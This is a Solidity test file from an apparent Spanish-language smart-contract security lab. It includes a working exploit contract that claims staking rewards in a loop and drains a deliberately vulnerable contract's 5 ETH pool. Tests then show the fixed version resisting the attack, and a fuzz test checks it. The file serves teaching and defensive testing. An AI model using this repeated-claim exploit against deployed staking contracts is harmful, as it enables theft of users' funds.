// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {BaseChallenge} from "./base/BaseChallenge.t.sol";
import {StakingVulnerable} from "../src/C9-logica-negocio/Vulnerable.sol";
import {StakingFixed} from "../src/C9-logica-negocio/Fixed.sol";

/// @notice Reclama la recompensa en bucle dentro de una sola transacción.
contract AtacanteStaking {
    function atacar(address payable staking, uint256 veces) external payable {
        StakingVulnerable s = StakingVulnerable(staking);
        s.depositar{value: msg.value}();
        for (uint256 i = 0; i < veces; i++) {
            s.reclamar();
        }
    }

    receive() external payable {}
}

contract C9_LogicaNegocio is BaseChallenge {
    function test_Exploit_Vulnerable() public {
        // Fondo de recompensas de 5 ETH.
        vm.prank(deployer);
        StakingVulnerable staking = new StakingVulnerable{value: 5 ether}();
        assertFalse(staking.isSolved());

        vm.prank(attacker);
        AtacanteStaking exploit = new AtacanteStaking();

        // Deposita 1 ETH y reclama en bucle: cada reclamo paga 1 ETH (TASA 100%).
        vm.prank(attacker);
        exploit.atacar{value: 1 ether}(payable(address(staking)), 6);

        assertTrue(staking.isSolved(), "el fondo queda vacio");
        assertEq(address(exploit).balance, 6 ether, "drena deposito + fondo (1+5)");
    }

    function test_Fixed_Resiste() public {
        vm.prank(deployer);
        StakingFixed staking = new StakingFixed{value: 5 ether}();

        vm.startPrank(attacker);
        staking.depositar{value: 1 ether}();
        // El primer reclamo paga la recompensa única (1 ETH); el segundo revierte.
        staking.reclamar();
        vm.expectRevert(bytes("nada pendiente"));
        staking.reclamar();
        vm.stopPrank();

        assertFalse(staking.isSolved(), "no se puede drenar en bucle");
        assertEq(address(staking).balance, 5 ether, "queda el fondo menos la recompensa justa");
    }

    /// @notice Prueba de propiedad (fuzzing): con cualquier depósito y cualquier
    /// número de reclamaciones, la versión corregida paga exactamente la
    /// recompensa debida, nunca más. Foundry la ejecuta con entradas aleatorias.
    function testFuzz_Fixed_NuncaPagaMasDeLoDebido(uint256 deposito, uint256 intentos) public {
        deposito = bound(deposito, 1, 5 ether);
        intentos = bound(intentos, 1, 20);

        vm.prank(deployer);
        StakingFixed staking = new StakingFixed{value: 5 ether}();

        vm.deal(attacker, deposito);
        vm.startPrank(attacker);
        staking.depositar{value: deposito}();
        uint256 antes = attacker.balance;
        for (uint256 i = 0; i < intentos; i++) {
            try staking.reclamar() {} catch {}
        }
        vm.stopPrank();

        uint256 debido = (deposito * staking.TASA()) / 100;
        assertEq(attacker.balance - antes, debido, "paga exactamente la recompensa debida");
    }
}
